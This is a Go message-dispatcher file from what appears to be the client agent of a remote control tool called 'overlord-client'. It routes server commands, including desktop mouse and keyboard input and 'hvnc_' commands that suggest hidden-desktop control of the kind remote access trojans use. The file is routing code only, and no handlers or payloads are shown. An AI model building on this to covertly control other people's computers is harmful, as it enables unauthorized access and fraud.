package handlers

import (
	"context"
	"fmt"
	"log"

	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/runtime"
)

type Dispatcher struct {
	Env *runtime.Env
}

func NewDispatcher(env *runtime.Env) *Dispatcher {
	return &Dispatcher{Env: env}
}

func (d *Dispatcher) Dispatch(ctx context.Context, envelope map[string]interface{}) (err error) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("dispatcher: panic: %v", r)
			err = fmt.Errorf("dispatcher panic: %v", r)
		}
	}()

	msgTypeRaw := envelope["type"]
	msgType, _ := msgTypeRaw.(string)
	if msgType == "" {
		log.Printf("dispatcher: missing type (keys=%v)", envelopeKeys(envelope))
		return nil
	}
	switch msgType {
	case "hello_ack":
		return HandleHelloAck(ctx, d.Env, envelope)
	case "ping":
		return HandlePing(ctx, d.Env, envelope)
	case "pong":
		return HandlePong(ctx, d.Env, envelope)
	case "frame_ack":
		capture.ReleaseFrameSlot()
		return nil
	case "command":
		cmdType, _ := envelope["commandType"].(string)
		switch cmdType {
		case "desktop_mouse_move", "desktop_mouse_down", "desktop_mouse_up", "desktop_mouse_wheel",
			"desktop_key_down", "desktop_key_up", "desktop_text",
			"hvnc_mouse_move", "hvnc_mouse_down", "hvnc_mouse_up",
			"hvnc_mouse_wheel", "hvnc_key_down", "hvnc_key_up":
		default:
			log.Printf("dispatcher: handling command type=%s", cmdType)
		}
		return HandleCommand(ctx, d.Env, envelope)
	case "plugin_event":
		return HandlePluginEvent(ctx, d.Env, envelope)
	case "notification_config":
		return HandleNotificationConfig(ctx, d.Env, envelope)
	case "command_abort":
		cmdID, _ := envelope["commandId"].(string)
		if cmdID != "" {
			if cancelCommand(cmdID) {
				log.Printf("dispatcher: cancelled command %s", cmdID)
			} else {
				log.Printf("dispatcher: command %s not found or already completed", cmdID)
			}
		}
		return nil
	default:
		log.Printf("dispatcher: unknown message type=%v", msgType)
		return nil
	}
}

func envelopeKeys(envelope map[string]interface{}) []string {
	keys := make([]string, 0, len(envelope))
	for key := range envelope {
		keys = append(keys, key)
	}
	return keys
}
